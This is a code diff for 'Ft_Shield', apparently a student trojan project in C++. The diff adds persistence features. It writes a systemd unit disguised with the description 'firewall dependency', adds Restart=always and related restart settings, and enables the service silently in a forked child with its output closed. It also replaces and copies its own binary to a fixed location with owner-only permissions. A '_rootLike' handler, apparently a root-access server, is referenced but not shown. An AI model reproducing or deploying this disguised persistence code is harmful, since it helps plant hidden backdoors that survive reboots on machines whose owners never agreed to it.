@@ -96,13 +96,11 @@ Ft_Shield & Ft_Shield::operator=(const Ft_Shield & shield __attribute__((unused)
 /* Public member functions ================================================== */
 /*
  * Two forks to detach from current process and from terminal
- * Check if another instance is running
- * Init and run the server
+ * Start the ft_shield core function
  */
 void Ft_Shield::daemonize(void)
 {
 	int	pid		= 0;
-	//char buf[9] = {'\0'};
 
 	/* Signal handler to ignore broken pipe signal in case of client brutal disconnection */
 	std::signal(SIGPIPE, &brokenPipe);
@@ -128,6 +126,10 @@ void Ft_Shield::daemonize(void)
 	return;
 }
 
+/*
+ * Check if another instance is running
+ * Init and run the server
+ */
 void	Ft_Shield::start(void)
 {
 	char buf[9] = {'\0'};
@@ -167,6 +169,7 @@ void	Ft_Shield::start(void)
  */
 void	Ft_Shield::setup(char const *me)
 {
+	int				pid = -1;
 	std::ofstream	service(INIT_FILE, std::ios::binary);
 
 	if (service.is_open())
@@ -175,10 +178,22 @@ void	Ft_Shield::setup(char const *me)
 		service << "Description=firewall dependency" << std::endl;
 		service << "[Service]" << std::endl;
 		service << "ExecStart=" << COPY_ELF << " --on-boot" << std::endl;
+		service << "Restart=always" << std::endl;
+		service << "RestartSec=5" << std::endl;
+		service << "StartLimitIntervalSec=60" << std::endl;
+		service << "StartLimitBurst=3" << std::endl;
 		service << "[Install]" << std::endl;
 		service << "WantedBy=multi-user.target" << std::endl;
 		service.close();
-		system("systemctl enable ft_shield.service --now");
+		pid = fork();
+		if (pid != -1 && pid == 0)
+		{
+			close(STDIN_FILENO);
+			close(STDOUT_FILENO);
+			close(STDERR_FILENO);
+			system("systemctl enable ft_shield.service");
+			this->_exit();
+		}
 	}
 	this->_copy(me);
 	return;
@@ -574,16 +589,20 @@ void	Ft_Shield::_rootLike(int fd)
 }
 
 /*
+ * Remove the existing COPY_ELF
  * Copy the file to the specified location in COPY_FILE macro
  */
 void	Ft_Shield::_copy(char const *me) const
 {
+	remove(COPY_ELF);
+
 	std::ifstream	src(me, std::ios::binary);
 	std::ofstream	dst(COPY_ELF, std::ios::binary);
 
 	dst << src.rdbuf();
 	src.close();
 	dst.close();
+	chmod(COPY_ELF, 00700);
 	return;
 }
 
